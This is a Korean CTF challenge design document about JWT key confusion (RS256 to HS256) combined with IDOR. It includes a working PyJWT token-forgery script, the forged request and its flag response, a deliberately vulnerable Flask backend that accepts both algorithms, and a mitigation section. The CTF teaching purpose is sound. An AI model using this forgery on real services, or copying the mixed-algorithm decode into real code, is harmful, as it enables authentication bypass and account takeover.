---
title: JWT Key Confusion & IDOR — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, jwt, key-confusion, idor, broken-authentication]
confidence: high
---

# JWT Key Confusion & IDOR — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Admin Dashboard (보안 관리자 대시보드)
- **난이도**: Medium
- **핵심 컨셉**: JWT(JSON Web Token) 서명 검증에서 발생하는 **알고리즘 혼동 공격(Algorithm Confusion / Key Confusion)** 취약점과 불충분한 권한 검증(**IDOR**)의 결합 문제입니다. 애플리케이션은 비대칭키 방식(RS256)을 사용하여 로그인 토큰을 발급하고 검증하지만, 서버의 느슨한 알고리즘 유연성으로 인해 대칭키 방식(HS256) 서명도 수용하게 됩니다. 공격자는 공개키를 비밀키처럼 취급해 조작된 토큰을 서명하고, 권한이 없는 다른 사용자(관리자) ID의 데이터에 접근하여 플래그를 탈취해야 합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend**: 로그인 화면 및 일반 유저용 정보 화면, 관리자 대시보드 화면(`/admin/dashboard`).
- **Backend Service (Python/Flask or Node.js/Express)**:
  - 사용자 로그인 시 JWT 토큰 발급.
  - 공개된 엔드포인트 `/public-key.pem` 또는 `/jwks.json`을 통해 JWT 서명 검증용 공개키(RSA Public Key) 제공.
- **Flag 위치**:
  - `admin` 권한을 획득하고 `/api/user/1/profile` (admin 계정 정보) 또는 `/admin/flag` 엔드포인트 호출 시 반환됨.

### 2.2 취약점 지점
1. **JWT Algorithm Confusion (RS256 to HS256)**:
   - 서버는 원래 공개키/개인키 쌍(RS256)으로 서명을 검증해야 합니다. 하지만 검증 함수 호출 시 알고리즘을 고정하지 않고 헤더의 `alg` 값을 신뢰하도록 구성되어 있습니다.
   - 만약 공격자가 토큰 헤더의 `alg`를 `HS256`으로 바꾸고, 서버가 공개해 놓은 **공개키(RSA Public Key)의 텍스트 콘텐츠**를 HMAC(대칭키) 서명용 **비밀키**로 지정하여 토큰을 서명하면, 서버는 라이브러리 내부 동작에 의해 이를 올바른 서명으로 검증하게 됩니다.
2. **IDOR (Insecure Direct Object Reference)**:
   - 프로필 조회 API 등에서 세션 토큰의 `userId` 또는 `username` 값을 확인해 데이터를 반환하지만, 적절한 역할(Role)이나 권한 관계 확인이 결여되어 토큰의 식별자 값만 위조되면 손쉽게 다른 유저 정보를 열람할 수 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|------------|--------|------|---------|---------|------|
| `/api/login` | POST | 없음 | `{"username": "user", "password": "..."}` | `{"token": "JWT..."}` | 일반 사용자 토큰 발급 |
| `/public-key.pem`| GET | 없음 | 없음 | RSA Public Key (PEM 포맷) | 서명 위조에 필요한 공개키 탈취 지점 |
| `/api/user/<id>` | GET | JWT 필요 | Header: `Authorization: Bearer <JWT>` | 사용자 상세 정보 | IDOR 및 조작된 JWT 확인 타겟 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. JWT 토큰 및 공개키 획득
1. 일반 계정(`guest` / `guest`)으로 로그인하여 발급받은 JWT 토큰을 획득합니다.
2. 애플리케이션 분석을 통해 `/public-key.pem` 경로에서 서버의 공개키를 다운로드합니다.

### Step 2. JWT 디코딩 및 페이로드 조작
JWT 토큰의 세 파트(Header.Payload.Signature) 중 Header와 Payload를 디코딩하여 수정합니다.
- **기존 Header**: `{"alg": "RS256", "typ": "JWT"}`  
  -> **변경 Header**: `{"alg": "HS256", "typ": "JWT"}` (대칭키 방식으로 강제 변경)
- **기존 Payload**: `{"userId": 102, "username": "guest", "role": "user"}`  
  -> **변경 Payload**: `{"userId": 1, "username": "admin", "role": "admin"}` (식별자 변조)

### Step 3. Key Confusion 서명 위조
대칭키 서명 알고리즘인 `HS256`의 비밀키 자리에 다운로드받은 **RSA 공개키 파일(텍스트 데이터 전체, 개행 포함)**을 입력으로 사용하여 서명을 다시 생성합니다.
- *공격 스크립트 예시 (Python PyJWT)*:
  ```python
  import jwt

  # 다운로드한 공개키 파일 읽기
  with open("public-key.pem", "r") as f:
      public_key = f.read()

  # 헤더와 페이로드 재구성
  headers = {"alg": "HS256", "typ": "JWT"}
  payload = {
      "userId": 1,
      "username": "admin",
      "role": "admin"
  }

  # 공개키를 대칭키(HS256)의 Secret Key로 활용하여 서명 생성
  forged_jwt = jwt.encode(payload, public_key, algorithm="HS256", headers=headers)
  print(forged_jwt)
  ```

### Step 4. 권한 우회 및 플래그 획득
변조된 JWT를 `Authorization: Bearer <forged_jwt>` 헤더로 지정하여 `/api/user/1` 또는 `/admin/dashboard` 엔드포인트를 호출합니다.
- *요청*:
  ```http
  GET /api/user/1 HTTP/1.1
  Host: challenge.local
  Authorization: Bearer <forged_jwt>
  ```
- *응답*:
  ```json
  {
    "status": "success",
    "user": {
      "userId": 1,
      "username": "admin",
      "role": "admin",
      "flag": "FLAG{jwt_k3y_c0nfu510n_rs256_to_hs256}"
    }
  }
  ```

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python PyJWT 1.x / 2.x 미흡 설정)

```python
# app.py
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)

# 서명 검증용 RSA 공개키 및 서명용 개인키 로드
with open("public-key.pem", "r") as f:
    PUBLIC_KEY = f.read()

@app.route("/public-key.pem", methods=["GET"])
def get_public_key():
    return PUBLIC_KEY, 200, {"Content-Type": "text/plain"}

@app.route("/api/user/<int:user_id>", methods=["GET"])
def get_user_profile(user_id):
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return jsonify({"error": "Missing token"}), 401
    
    token = auth_header.split(" ")[1]
    
    try:
        # 취약점 발생 지점: algorithms 매개변수에 RS256과 HS256이 동시에 허용되어 있거나 고정되지 않음.
        # 또한 jwt.decode가 전달받는 키를 검증 알고리즘에 따라 대칭키 또는 비대칭키로 동적으로 해석함.
        decoded = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256", "HS256"])
        
        # IDOR 취약점 지점: 요청한 user_id와 토큰 내부의 식별자 일치 여부만 느슨하게 확인
        if decoded.get("role") == "admin" or str(decoded.get("userId")) == str(user_id):
            if user_id == 1:
                return jsonify({
                    "status": "success",
                    "user": {
                        "userId": 1,
                        "username": "admin",
                        "role": "admin",
                        "flag": "FLAG{jwt_k3y_c0nfu510n_rs256_to_hs256}"
                    }
                })
            else:
                return jsonify({
                    "status": "success",
                    "user": {"userId": user_id, "username": "normal_user", "role": "user"}
                })
        else:
            return jsonify({"error": "Unauthorized access"}), 403
            
    except jwt.ExpiredSignatureError:
        return jsonify({"error": "Token expired"}), 401
    except jwt.InvalidTokenError:
        return jsonify({"error": "Invalid token"}), 401

if __name__ == "__main__":
    app.run(port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **검증 알고리즘 고정 (Strict Algorithm Whitelisting)**:
   - JWT 검증 코드 실행 시 허용할 알고리즘 목록을 단 하나만 고정해서 명시합니다. (`algorithms=["RS256"]`)
   - 헤더의 `alg` 필드를 신뢰하여 키의 역할을 유동적으로 해석하지 않아야 합니다.
2. **라이브러리 최신 업데이트 및 안전한 API 디자인**:
   - 최신 PyJWT 및 주요 JWT 검증 라이브러리는 공개키 객체로 `HS256` 서명을 검증하려고 시도하면 에러를 발생시키는 기본 차단 필터가 동작하도록 개선되었습니다.
3. **토큰 내 역할 및 데이터베이스 기반 접근 제어**:
   - 단순히 토큰에 실린 권한 정보(예: `role: admin`)만 신뢰하지 말고, 비즈니스 로직 단에서 실제 사용자 세션 상태 및 세부 권한 불일치 여부를 인가 필터(Access Control Layer)를 통해 꼼꼼하게 교차 검증해야 합니다.
